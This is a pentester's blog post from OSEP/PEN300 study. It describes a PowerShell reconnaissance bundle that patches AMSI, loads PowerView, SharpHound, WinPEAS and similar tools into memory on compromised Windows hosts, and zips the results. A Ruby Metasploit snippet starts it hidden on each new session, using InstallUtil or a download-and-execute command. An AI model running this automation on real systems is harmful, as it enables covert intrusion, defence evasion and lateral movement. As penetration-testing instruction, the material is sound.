<!DOCTYPE html>
<html><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="/css/highlight.min.css">
    <link rel="stylesheet" type="text/css" href="/css/style.css">
    
    
    <title>Taha Draidia | Automate the Reconnaissance Phase</title>
    <script src="/js/highlight.min.js"></script>
    <script> hljs.initHighlightingOnLoad(); </script>
</head><body>
        
        <div id="container" class="container">
<span class="home_button"><a href="/">Back to home</a></span>
<h2 class="note_title">
<a href="/posts/automate-the-reconnaissance-phase/" rel="bookmark"
           title="Permalink to Automate the Reconnaissance Phase">Automate the Reconnaissance Phase</a></h2>


<div class="note_info">
        <div class="origin">
            <strong>Created by:</strong><a href="https://twitter.com/tahadraidia">@tahadraidia</a> || <a href="https://tahadraidia.com">tahadraidia.com</a> 
        </div>
		<br />

        <div class="published" title="2021-12-02 07:43:03 &#43;0000 UTC">
            <strong>Published:</strong> <time datetime="2021-12-02">Dec 2, 2021</time>
        </div>
		<br />

        <div class="tags" title="tags">
        	
        	<strong>Tags:</strong>
        	
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/osep">OSEP</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/pen300">PEN300</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/powershell">Powershell</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/.net-assembly">.NET Assembly</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/c">C#</a>
            
			
            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/ruby">Ruby</a>
            
            
        </div>
</div>

<br>
<p>If you have been reading my OSEP (PEN300) post series, you know that I love automating things, reconnaissance phase is one of the repetitive tasks that you do for each machine you compromise right.</p>
<p>In this post, I am going to share with you how I took advantage of the existing scripts and tools to create let&rsquo;s say a reconnaissance script bundle.</p>
<p>The script is written into Powershell, the language has a rich API and special when it allow us to load .NET Assembly this make it super powerful and the right tool for the task.</p>
<p>Before we go any further, there is a little caveat here, the script was made for Windows machines only. That being said the way I wrote the script has the following workflow:</p>
<ul>
<li>
<p>The first step the script does is to patch AMSI</p>
</li>
<li>
<p>Checks for writable location so it can save scans result files</p>
</li>
<li>
<p>Verify if the script has been run if so it bails</p>
</li>
<li>
<p>Loads in memory the following scripts and tools</p>
<ul>
<li>PowerView.ps1 (Only if the machine is Domain-Joined)</li>
<li>SharpHound.ps1 (Only if the machine is Domain-Joined)</li>
<li>PowerUPSQL.ps1</li>
<li>PriveCheck.ps1</li>
<li>HostRecon.ps1</li>
<li>WinPEASx64.exe</li>
</ul>
</li>
<li>
<p>Each loaded tools gets executed and its result is save into a file</p>
</li>
<li>
<p>Create a ZIP file contain result files in this format <a href="mailto:username@machine.recon.zip">username@machine.recon.zip</a></p>
</li>
</ul>
<p>This script gets executed for each new Meterpreter session, the way the script gets executed depends of the environment, if the for instance the current session has Powershell restricted language enabled the script get executed by leveraging InstallUtils otherwise it gets run from session shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_restricted_language?</span>
	cmd <span style="color:#f92672">=</span> $powershell<span style="color:#f92672">.</span>execute_command(<span style="color:#e6db74">&#39;$ExecutionContext.SessionState.LanguageMode&#39;</span>)
	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span> <span style="color:#66d9ef">if</span> cmd<span style="color:#f92672">.</span>include? <span style="color:#e6db74">&#39;ConstrainedLanguage&#39;</span>
	<span style="color:#66d9ef">false</span>
<span style="color:#66d9ef">end</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_powershell_recon_script</span>
	process <span style="color:#f92672">=</span> <span style="color:#66d9ef">nil</span>
	<span style="color:#66d9ef">if</span> is_restricted_language?
		print_status(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Powershell restricted language is enabled&#34;</span>)
		process <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;C:\\Windows\\System32\\cmd.exe&#39;</span>,
		generate_cmd_arg_installutils_instance(<span style="color:#e6db74">&#39;recon.exe&#39;</span>), { <span style="color:#e6db74">&#39;Hidden&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span> })
	<span style="color:#66d9ef">else</span>
		process <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>process<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#39;C:\\Windows\\System32\\cmd.exe&#39;</span>,
		generate_cmd_arg_pwsh_download_exec(<span style="color:#e6db74">&#39;recon.ps1&#39;</span>), { <span style="color:#e6db74">&#39;Hidden&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span> })
	<span style="color:#66d9ef">end</span>
	pid <span style="color:#f92672">=</span> process<span style="color:#f92672">.</span>pid
	<span style="color:#66d9ef">if</span> pid
		print_good(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Powershell recon script started running in background: PID </span><span style="color:#e6db74">#{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
	<span style="color:#66d9ef">else</span>
		print_error(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Failed starting powershell recon script&#34;</span>)
	<span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><p>Having this in place, made life more easier, also the advantage of this is that each time you compromise a new credentials, execute an MSF agent so it runs the BloodHound AD reconnaissance, which comes really handy at the lateral movement phase.</p>
<p>Please note that this script is noisy and not OPSEC safe, it was written to do the heavy lifting for us in internal pentest engagement not for red team engagements.</p>
<p>You can find the full Powershell script here:</p>
<p><a href="https://gist.github.com/tahadraidia/fca2d202ade39f5296123c69597eedd3">https://gist.github.com/tahadraidia/fca2d202ade39f5296123c69597eedd3</a></p>
<p>References:</p>
<ul>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></li>
<li><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a></li>
<li><a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1</a></li>
<li><a href="https://github.com/dafthack/HostRecon/blob/master/HostRecon.ps1">https://github.com/dafthack/HostRecon/blob/master/HostRecon.ps1</a></li>
<li><a href="https://github.com/itm4n/PrivescCheck">https://github.com/itm4n/PrivescCheck</a></li>
<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a></li>
</ul>

  <div class="contact">
    <h2>Contact</h2>
    Please feel free to ping me at <a href="https://twitter.com/tahadraidia">@tahadraidia</a>. Also you can see more of my work at <a href="https://tahadraidia.com">https://tahadraidia.com</a>.
</div>
</br> 
        </div>
        <script> hljs.initHighlightingOnLoad(); </script></body>
</html>
